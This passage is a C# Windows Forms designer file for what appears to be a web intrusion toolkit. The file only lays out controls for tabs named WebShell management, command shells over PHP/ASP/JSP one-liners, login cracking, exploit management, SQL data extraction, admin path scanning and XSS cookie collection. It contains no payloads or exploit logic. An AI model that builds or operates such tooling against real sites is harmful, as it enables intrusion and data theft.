            this.txt_cookiesURL = new System.Windows.Forms.TextBox();
            this.btn_setCookieExpires = new System.Windows.Forms.Button();
            this.web_cookie = new System.Windows.Forms.WebBrowser();
            this.tab_FileManage = new System.Windows.Forms.TabPage();
            this.label14 = new System.Windows.Forms.Label();
            this.lv_DirList = new System.Windows.Forms.ListView();
            this.imgListFileMgr = new System.Windows.Forms.ImageList(this.components);
            this.button5 = new System.Windows.Forms.Button();
            this.cbb_WebFilePath = new System.Windows.Forms.ComboBox();
            this.tv_dirList = new System.Windows.Forms.TreeView();
            this.tab_CmdShell = new System.Windows.Forms.TabPage();
            this.rb_cgiCmd = new System.Windows.Forms.RadioButton();
            this.rb_rubyCmd = new System.Windows.Forms.RadioButton();
            this.rb_perlCmd = new System.Windows.Forms.RadioButton();
            this.rb_pythonCmd = new System.Windows.Forms.RadioButton();
            this.rb_cfmCmd = new System.Windows.Forms.RadioButton();
            this.txt_jspOne = new System.Windows.Forms.TextBox();
            this.txt_phpOne = new System.Windows.Forms.TextBox();
            this.txt_aspOne = new System.Windows.Forms.TextBox();
            this.txt_aspxOne = new System.Windows.Forms.TextBox();
            this.btn_phpOne = new System.Windows.Forms.Button();
            this.btn_aspOne = new System.Windows.Forms.Button();
            this.btn_jspOne = new System.Windows.Forms.Button();
            this.btn_aspxOne = new System.Windows.Forms.Button();
            this.cbb_WebCommond = new System.Windows.Forms.ComboBox();
            this.rb_aspCmd = new System.Windows.Forms.RadioButton();
            this.label11 = new System.Windows.Forms.Label();
            this.txt_TimeOutCmd = new System.Windows.Forms.TextBox();
            this.label10 = new System.Windows.Forms.Label();
            this.cbb_utf8Gb3212CMD = new System.Windows.Forms.ComboBox();
            this.rb_jspCmd = new System.Windows.Forms.RadioButton();
            this.rb_phpCmd = new System.Windows.Forms.RadioButton();
            this.label9 = new System.Windows.Forms.Label();
            this.rb_aspxCmd = new System.Windows.Forms.RadioButton();
            this.btn_ExecuteWebCMD = new System.Windows.Forms.Button();
            this.btn_connectOneShell = new System.Windows.Forms.Button();
            this.txt_OneShellPwd = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.txt_OneShellPath = new System.Windows.Forms.TextBox();
            this.txt_WebCmdResult = new System.Windows.Forms.TextBox();
            this.chk_VisbleOnePwd = new System.Windows.Forms.CheckBox();
            this.label6 = new System.Windows.Forms.Label();
            this.tab_webLoginCrack = new System.Windows.Forms.TabPage();
            this.label13 = new System.Windows.Forms.Label();
            this.btn_DiyloginUrlCrack = new System.Windows.Forms.Button();
            this.button1 = new System.Windows.Forms.Button();
            this.tab_ExploitManage = new System.Windows.Forms.TabPage();
            this.button2 = new System.Windows.Forms.Button();
            this.txt_ExpURL = new System.Windows.Forms.TextBox();
            this.tab_webExp = new System.Windows.Forms.TabControl();
            this.rm_ExpMgrInOut = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.重新加载EXPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripSeparator();
            this.expInputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.button9 = new System.Windows.Forms.Button();
            this.button8 = new System.Windows.Forms.Button();
            this.btn_WebExploitNivigate = new System.Windows.Forms.Button();
            this.label12 = new System.Windows.Forms.Label();
            this.web_exploit = new System.Windows.Forms.WebBrowser();
            this.tab_DataOutput = new System.Windows.Forms.TabPage();
            this.lbl_resultDataOut = new System.Windows.Forms.Label();
            this.lbl_found = new System.Windows.Forms.Label();
            this.lbl_check = new System.Windows.Forms.Label();
            this.gb_dataOutput = new System.Windows.Forms.GroupBox();
            this.txt_dataOutEndStr = new System.Windows.Forms.TextBox();
            this.txt_dataOutstartStr = new System.Windows.Forms.TextBox();
            this.chk_DataOutRegex = new System.Windows.Forms.CheckBox();
            this.rb_PostDataOut = new System.Windows.Forms.RadioButton();
            this.rb_GetDataOut = new System.Windows.Forms.RadioButton();
            this.txt_sqlDataOutput = new System.Windows.Forms.TextBox();
            this.txt_urlDataOutput = new System.Windows.Forms.TextBox();
            this.pictureBox14 = new System.Windows.Forms.PictureBox();
            this.label20 = new System.Windows.Forms.Label();
            this.pictureBox13 = new System.Windows.Forms.PictureBox();
            this.label24 = new System.Windows.Forms.Label();
            this.txt_ThreadsOutData = new System.Windows.Forms.TextBox();
            this.txt_maxnum = new System.Windows.Forms.TextBox();
            this.txt_minnum = new System.Windows.Forms.TextBox();
            this.cbb_DataOutEncoding = new System.Windows.Forms.ComboBox();
            this.btn_dataOutputMul = new System.Windows.Forms.Button();
            this.lbl_threads = new System.Windows.Forms.Label();
            this.label17 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.chk_DataOutputSetting = new System.Windows.Forms.CheckBox();
            this.lbl_dataOutEndStr = new System.Windows.Forms.Label();
            this.lbl_dataOutStrStart = new System.Windows.Forms.Label();
            this.button4 = new System.Windows.Forms.Button();
            this.label23 = new System.Windows.Forms.Label();
            this.btn_DataOutput = new System.Windows.Forms.Button();
            this.btn_OutDataStop = new System.Windows.Forms.Button();
            this.txt_dataOutRegex = new System.Windows.Forms.TextBox();
            this.lbl_dataOutRexex = new System.Windows.Forms.Label();
            this.txt_resultDataOut = new System.Windows.Forms.TextBox();
            this.tab_ScanAdmin = new System.Windows.Forms.TabPage();
            this.LV_ScanAdmin = new System.Windows.Forms.ListView();
            this.rm_ScanAdmin = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.用Firefox打开ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.用Chrome打开ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.用微软IE打开ToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.txt_ScanAdminURL = new System.Windows.Forms.TextBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label33 = new System.Windows.Forms.Label();
            this.txt_ThreadsScanAdmin = new System.Windows.Forms.TextBox();
            this.label31 = new System.Windows.Forms.Label();
            this.rb_ASPX = new System.Windows.Forms.RadioButton();
            this.rb_Shell = new System.Windows.Forms.RadioButton();
            this.rb_UPfile = new System.Windows.Forms.RadioButton();
            this.rb_4P = new System.Windows.Forms.RadioButton();
            this.rb_dir = new System.Windows.Forms.RadioButton();
            this.rb_backup = new System.Windows.Forms.RadioButton();
            this.rb_DataBase = new System.Windows.Forms.RadioButton();
            this.rb_CGI = new System.Windows.Forms.RadioButton();
            this.rb_JSP = new System.Windows.Forms.RadioButton();
            this.rb_PHP = new System.Windows.Forms.RadioButton();
            this.rb_ASP = new System.Windows.Forms.RadioButton();
            this.rb_ALL = new System.Windows.Forms.RadioButton();
            this.lbl_ScanAdminResult = new System.Windows.Forms.Label();
            this.txt_ScanAdminResult = new System.Windows.Forms.TextBox();
            this.btn_StopScanAdmin = new System.Windows.Forms.Button();
            this.btn_MoreThreadScanAdmin = new System.Windows.Forms.Button();
            this.btn_ClearScanAdmin = new System.Windows.Forms.Button();
            this.btn_SingleScanAdmin = new System.Windows.Forms.Button();
            this.tab_googleHackDB = new System.Windows.Forms.TabPage();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.label30 = new System.Windows.Forms.Label();
            this.btn_ghdb_Search = new System.Windows.Forms.Button();
            this.txt_ghdb_search_text = new System.Windows.Forms.TextBox();
            this.label29 = new System.Windows.Forms.Label();
            this.label28 = new System.Windows.Forms.Label();
            this.cbb_ghdb_earchCat = new System.Windows.Forms.ComboBox();
            this.tab_notepad = new System.Windows.Forms.TabPage();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.button6 = new System.Windows.Forms.Button();
            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
            this.treeView1 = new System.Windows.Forms.TreeView();
            this.tab_XssAnalysis = new System.Windows.Forms.TabPage();
            this.label26 = new System.Windows.Forms.Label();
            this.gb_xssAnalysis = new System.Windows.Forms.GroupBox();
            this.comboBox10 = new System.Windows.Forms.ComboBox();
            this.comboBox11 = new System.Windows.Forms.ComboBox();
            this.comboBox9 = new System.Windows.Forms.ComboBox();
            this.comboBox8 = new System.Windows.Forms.ComboBox();
            this.comboBox7 = new System.Windows.Forms.ComboBox();
            this.comboBox6 = new System.Windows.Forms.ComboBox();
            this.lbl_OtherMobileCount = new System.Windows.Forms.Label();
            this.lbl_OtherIECount = new System.Windows.Forms.Label();
            this.pictureBox47 = new System.Windows.Forms.PictureBox();
            this.pictureBox48 = new System.Windows.Forms.PictureBox();
            this.lbl_BlackBerryCount = new System.Windows.Forms.Label();
            this.lbl_SAMSUNGCount = new System.Windows.Forms.Label();
            this.pictureBox35 = new System.Windows.Forms.PictureBox();
            this.pictureBox45 = new System.Windows.Forms.PictureBox();
            this.lbl_NokiaCount = new System.Windows.Forms.Label();
            this.pictureBox46 = new System.Windows.Forms.PictureBox();
            this.lbl_WinPhoneCount = new System.Windows.Forms.Label();
            this.lbl_AndroidCount = new System.Windows.Forms.Label();
            this.pictureBox37 = new System.Windows.Forms.PictureBox();
            this.pictureBox38 = new System.Windows.Forms.PictureBox();
            this.lbl_iPadCount = new System.Windows.Forms.Label();
            this.lbl_iPhoneCount = new System.Windows.Forms.Label();
            this.lbl_BSDCount = new System.Windows.Forms.Label();
            this.lbl_UnixCount = new System.Windows.Forms.Label();
            this.lbl_LinuxCount = new System.Windows.Forms.Label();
            this.lbl_MACCount = new System.Windows.Forms.Label();
            this.pictureBox39 = new System.Windows.Forms.PictureBox();
            this.pictureBox40 = new System.Windows.Forms.PictureBox();
            this.pictureBox41 = new System.Windows.Forms.PictureBox();
            this.pictureBox42 = new System.Windows.Forms.PictureBox();
            this.pictureBox43 = new System.Windows.Forms.PictureBox();
            this.pictureBox44 = new System.Windows.Forms.PictureBox();
            this.lbl_Win2000Count = new System.Windows.Forms.Label();
            this.pictureBox36 = new System.Windows.Forms.PictureBox();
            this.lbl_WinXPCount = new System.Windows.Forms.Label();
            this.lbl_Win2003Count = new System.Windows.Forms.Label();
            this.lbl_Win7Count = new System.Windows.Forms.Label();
            this.lbl_Win8Count = new System.Windows.Forms.Label();
            this.lbl_Win81Count = new System.Windows.Forms.Label();
            this.lbl_Win10Count = new System.Windows.Forms.Label();
            this.pictureBox29 = new System.Windows.Forms.PictureBox();
            this.pictureBox30 = new System.Windows.Forms.PictureBox();
            this.pictureBox31 = new System.Windows.Forms.PictureBox();
            this.pictureBox32 = new System.Windows.Forms.PictureBox();
            this.pictureBox33 = new System.Windows.Forms.PictureBox();
            this.pictureBox34 = new System.Windows.Forms.PictureBox();
            this.lbl_NetscapeCount = new System.Windows.Forms.Label();
            this.lbl_UCWEBCount = new System.Windows.Forms.Label();
            this.lbl_OperaCount = new System.Windows.Forms.Label();
            this.lbl_SafariCount = new System.Windows.Forms.Label();
            this.lbl_ChromeCount = new System.Windows.Forms.Label();
            this.lbl_FirefoxCount = new System.Windows.Forms.Label();
            this.pictureBox23 = new System.Windows.Forms.PictureBox();
            this.pictureBox24 = new System.Windows.Forms.PictureBox();
            this.pictureBox25 = new System.Windows.Forms.PictureBox();
            this.pictureBox26 = new System.Windows.Forms.PictureBox();
            this.pictureBox27 = new System.Windows.Forms.PictureBox();
            this.pictureBox28 = new System.Windows.Forms.PictureBox();
            this.pictureBox22 = new System.Windows.Forms.PictureBox();
            this.lbl_XssIPcount = new System.Windows.Forms.Label();
            this.lbl_XssCookieCount = new System.Windows.Forms.Label();
            this.lbl_IE11count = new System.Windows.Forms.Label();
            this.lbl_IE10count = new System.Windows.Forms.Label();
            this.lbl_IE9count = new System.Windows.Forms.Label();
            this.lbl_IE8count = new System.Windows.Forms.Label();
            this.lbl_IE7count = new System.Windows.Forms.Label();
            this.lbl_IE6count = new System.Windows.Forms.Label();
            this.pictureBox20 = new System.Windows.Forms.PictureBox();
            this.pictureBox21 = new System.Windows.Forms.PictureBox();
            this.pictureBox18 = new System.Windows.Forms.PictureBox();
            this.pictureBox19 = new System.Windows.Forms.PictureBox();
            this.pictureBox17 = new System.Windows.Forms.PictureBox();
            this.pictureBox16 = new System.Windows.Forms.PictureBox();
            this.pictureBox15 = new System.Windows.Forms.PictureBox();
            this.lbl_XssInfo = new System.Windows.Forms.Label();
            this.comboBox3 = new System.Windows.Forms.ComboBox();
            this.label25 = new System.Windows.Forms.Label();
            this.comboBox2 = new System.Windows.Forms.ComboBox();
            this.btn_OpenXssDB = new System.Windows.Forms.Button();
            this.tab_Introduction = new System.Windows.Forms.TabPage();
            this.txt_About = new System.Windows.Forms.TextBox();
            this.imageList_tab = new System.Windows.Forms.ImageList(this.components);
            this.rm_ExpMgrBtn = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.expDeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.expUpdateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendToSubmitTestToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.发送到DataOutputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.setTagToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rm_FileMgrTree = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.lbl_AppICO = new System.Windows.Forms.Label();
            this.rm_appFunction = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.系统设置ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem56 = new System.Windows.Forms.ToolStripSeparator();
            this.webShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.expDebugToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.encodeDecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cookieBrowseToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileManageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmdShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.webCrackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exploitDBToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.dataOutputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.googleHackToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.notepadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.xssAnalysisToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem51 = new System.Windows.Forms.ToolStripSeparator();
            this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.introductionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.模块设置ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.lbl_appTitle = new System.Windows.Forms.Label();
            this.icoBtn_ExpDebug = new System.Windows.Forms.Button();
            this.icoBtn_about = new System.Windows.Forms.Button();
            this.icoBtn_dataOutput = new System.Windows.Forms.Button();
            this.icoBtn_WebShell = new System.Windows.Forms.Button();
            this.icoBtn_CookieBrowser = new System.Windows.Forms.Button();
            this.icoBtn_CmdShell = new System.Windows.Forms.Button();
            this.icoBtn_encodeDecode = new System.Windows.Forms.Button();
            this.icoBtn_EXploitDB = new System.Windows.Forms.Button();
            this.我在这ToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.lbl_K8Holiday = new System.Windows.Forms.Label();
            this.imgListWebInfo = new System.Windows.Forms.ImageList(this.components);
            this.icoBtn_ScanAdmin = new System.Windows.Forms.Button();
            this.icoBtn_XssAnalysis = new System.Windows.Forms.Button();
            this.tab_MainForm.SuspendLayout();
            this.tab_ShellManage.SuspendLayout();
            this.rm_ShellMgr.SuspendLayout();
            this.tab_SubmitTest.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox10)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pic_server)).BeginInit();
            this.rm_CopyDebugInfo.SuspendLayout();
            this.tab_EncodeDecode.SuspendLayout();
            this.rm_encodeDecode.SuspendLayout();
            this.tab_CookieBrowser.SuspendLayout();
            this.tab_FileManage.SuspendLayout();
            this.tab_CmdShell.SuspendLayout();
            this.tab_webLoginCrack.SuspendLayout();
            this.tab_ExploitManage.SuspendLayout();
            this.rm_ExpMgrInOut.SuspendLayout();
            this.tab_DataOutput.SuspendLayout();
            this.gb_dataOutput.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox14)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).BeginInit();
            this.tab_ScanAdmin.SuspendLayout();
            this.rm_ScanAdmin.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.tab_googleHackDB.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.tab_notepad.SuspendLayout();
            this.tab_XssAnalysis.SuspendLayout();
            this.gb_xssAnalysis.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox47)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox48)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox35)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox45)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox46)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox37)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox38)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox39)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox40)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox41)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox42)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox43)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox44)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox36)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox29)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox30)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox31)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox32)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox33)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox34)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox23)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox24)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox25)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox26)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox27)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox28)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox22)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox20)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox21)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox19)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox15)).BeginInit();
            this.tab_Introduction.SuspendLayout();
            this.rm_ExpMgrBtn.SuspendLayout();
            this.rm_appFunction.SuspendLayout();
            this.SuspendLayout();
            // 
            // tab_MainForm
            // 
            this.tab_MainForm.Alignment = System.Windows.Forms.TabAlignment.Bottom;
            this.tab_MainForm.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.tab_MainForm.Controls.Add(this.tab_ShellManage);
            this.tab_MainForm.Controls.Add(this.tab_SubmitTest);
            this.tab_MainForm.Controls.Add(this.tab_EncodeDecode);
            this.tab_MainForm.Controls.Add(this.tab_CookieBrowser);
            this.tab_MainForm.Controls.Add(this.tab_FileManage);
            this.tab_MainForm.Controls.Add(this.tab_CmdShell);
            this.tab_MainForm.Controls.Add(this.tab_webLoginCrack);
            this.tab_MainForm.Controls.Add(this.tab_ExploitManage);
            this.tab_MainForm.Controls.Add(this.tab_DataOutput);
            this.tab_MainForm.Controls.Add(this.tab_ScanAdmin);
            this.tab_MainForm.Controls.Add(this.tab_googleHackDB);
            this.tab_MainForm.Controls.Add(this.tab_notepad);
            this.tab_MainForm.Controls.Add(this.tab_XssAnalysis);
            this.tab_MainForm.Controls.Add(this.tab_Introduction);
            this.tab_MainForm.ImageList = this.imageList_tab;
            this.tab_MainForm.Location = new System.Drawing.Point(6, 64);
            this.tab_MainForm.Name = "tab_MainForm";
            this.tab_MainForm.SelectedIndex = 0;
            this.tab_MainForm.Size = new System.Drawing.Size(988, 650);
            this.tab_MainForm.TabIndex = 0;
            this.tab_MainForm.Selected += new System.Windows.Forms.TabControlEventHandler(this.tab_MainForm_Selected);
            // 
            // tab_ShellManage
            // 
            this.tab_ShellManage.Controls.Add(this.lv_webShell);
            this.tab_ShellManage.ImageIndex = 13;
            this.tab_ShellManage.Location = new System.Drawing.Point(4, 4);
            this.tab_ShellManage.Name = "tab_ShellManage";
            this.tab_ShellManage.Padding = new System.Windows.Forms.Padding(3);
            this.tab_ShellManage.Size = new System.Drawing.Size(980, 623);
            this.tab_ShellManage.TabIndex = 5;
            this.tab_ShellManage.Text = "WebShell";
            this.tab_ShellManage.UseVisualStyleBackColor = true;
            // 
            // lv_webShell
            // 
            this.lv_webShell.AccessibleRole = System.Windows.Forms.AccessibleRole.Grip;
            this.lv_webShell.Activation = System.Windows.Forms.ItemActivation.OneClick;
            this.lv_webShell.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.lv_webShell.BackColor = System.Drawing.SystemColors.Window;
            this.lv_webShell.ContextMenuStrip = this.rm_ShellMgr;
            this.lv_webShell.Font = new System.Drawing.Font("SimSun", 9F);
            this.lv_webShell.ForeColor = System.Drawing.SystemColors.WindowText;
            this.lv_webShell.FullRowSelect = true;
            this.lv_webShell.GridLines = true;
            this.lv_webShell.HoverSelection = true;
            this.lv_webShell.LabelEdit = true;
            this.lv_webShell.Location = new System.Drawing.Point(3, 3);
            this.lv_webShell.Name = "lv_webShell";
            this.lv_webShell.Size = new System.Drawing.Size(974, 617);
            this.lv_webShell.TabIndex = 5;
            this.lv_webShell.UseCompatibleStateImageBehavior = false;
            this.lv_webShell.View = System.Windows.Forms.View.Details;
            // 
            // rm_ShellMgr
            // 
            this.rm_ShellMgr.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem3,
            this.添加ToolStripMenuItem,
            this.修改ToolStripMenuItem,
            this.删除ToolStripMenuItem,
            this.批量删除ToolStripMenuItem,
            this.toolStripMenuItem4,
            this.用浏览器打开ToolStripMenuItem,
            this.toolStripMenuItem1,
            this.cookie浏览器ToolStripMenuItem,
            this.文件管理ToolStripMenuItem,
            this.虚拟CMD终端ToolStripMenuItem,
            this.toolStripMenuItem2,
            this.列表排序ToolStripMenuItem,
            this.检查是否在控ToolStripMenuItem,
            this.toolStripMenuItem7,
            this.合并数据库ToolStripMenuItem,
            this.toolStripMenuItem6});
            this.rm_ShellMgr.Name = "rightMenu_WebShell";
            this.rm_ShellMgr.Size = new System.Drawing.Size(131, 282);
            // 
            // toolStripMenuItem3
            // 
            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
            this.toolStripMenuItem3.Size = new System.Drawing.Size(127, 6);
            // 
            // 添加ToolStripMenuItem
            // 
            this.添加ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("添加ToolStripMenuItem.Image")));
            this.添加ToolStripMenuItem.Name = "添加ToolStripMenuItem";
            this.添加ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.添加ToolStripMenuItem.Text = "添加";
            this.添加ToolStripMenuItem.Click += new System.EventHandler(this.添加ToolStripMenuItem_Click);
            // 
            // 修改ToolStripMenuItem
            // 
            this.修改ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("修改ToolStripMenuItem.Image")));
            this.修改ToolStripMenuItem.Name = "修改ToolStripMenuItem";
            this.修改ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.修改ToolStripMenuItem.Text = "修改";
            this.修改ToolStripMenuItem.Click += new System.EventHandler(this.修改ToolStripMenuItem_Click);
            // 
            // 删除ToolStripMenuItem
            // 
            this.删除ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("删除ToolStripMenuItem.Image")));
            this.删除ToolStripMenuItem.Name = "删除ToolStripMenuItem";
            this.删除ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.删除ToolStripMenuItem.Text = "删除(单条)";
            this.删除ToolStripMenuItem.Visible = false;
            this.删除ToolStripMenuItem.Click += new System.EventHandler(this.删除ToolStripMenuItem_Click);
            // 
            // 批量删除ToolStripMenuItem
            // 
            this.批量删除ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("批量删除ToolStripMenuItem.Image")));
            this.批量删除ToolStripMenuItem.Name = "批量删除ToolStripMenuItem";
            this.批量删除ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.批量删除ToolStripMenuItem.Text = "删除";
            this.批量删除ToolStripMenuItem.Click += new System.EventHandler(this.批量删除ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem4
            // 
            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
            this.toolStripMenuItem4.Size = new System.Drawing.Size(127, 6);
            // 
            // 用浏览器打开ToolStripMenuItem
            // 
            this.用浏览器打开ToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.用Firefox打开ToolStripMenuItem,
            this.用Chrome打开ToolStripMenuItem,
            this.用微软IE打开ToolStripMenuItem});
            this.用浏览器打开ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("用浏览器打开ToolStripMenuItem.Image")));
            this.用浏览器打开ToolStripMenuItem.Name = "用浏览器打开ToolStripMenuItem";
            this.用浏览器打开ToolStripMenuItem.Size = new System.Drawing.Size(130, 22);
            this.用浏览器打开ToolStripMenuItem.Text = "浏览器";
            // 
            // 用Firefox打开ToolStripMenuItem
            // 
            this.用Firefox打开ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("用Firefox打开ToolStripMenuItem.Image")));
            this.用Firefox打开ToolStripMenuItem.Name = "用Firefox打开ToolStripMenuItem";
            this.用Firefox打开ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.用Firefox打开ToolStripMenuItem.Text = "用Firefox-->打开";
            this.用Firefox打开ToolStripMenuItem.Click += new System.EventHandler(this.用Firefox打开ToolStripMenuItem_Click);
            // 
            // 用Chrome打开ToolStripMenuItem
            // 
            this.用Chrome打开ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("用Chrome打开ToolStripMenuItem.Image")));
            this.用Chrome打开ToolStripMenuItem.Name = "用Chrome打开ToolStripMenuItem";
            this.用Chrome打开ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.用Chrome打开ToolStripMenuItem.Text = "用Chrome->打开";
            this.用Chrome打开ToolStripMenuItem.Click += new System.EventHandler(this.用Chrome打开ToolStripMenuItem_Click);
            // 
            // 用微软IE打开ToolStripMenuItem
            // 
            this.用微软IE打开ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("用微软IE打开ToolStripMenuItem.Image")));
            this.用微软IE打开ToolStripMenuItem.Name = "用微软IE打开ToolStripMenuItem";
            this.用微软IE打开ToolStripMenuItem.Size = new System.Drawing.Size(166, 22);
            this.用微软IE打开ToolStripMenuItem.Text = "用微软IE -->打开";
            this.用微软IE打开ToolStripMenuItem.Click += new System.EventHandler(this.用微软IE打开ToolStripMenuItem_Click);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(127, 6);
            // 
            // cookie浏览器ToolStripMenuItem
            // 
            this.cookie浏览器ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("cookie浏览器ToolStripMenuItem.Image")));
            this.cookie浏览器ToolStripMenuItem.Name = "cookie浏览器ToolStripMenuItem";
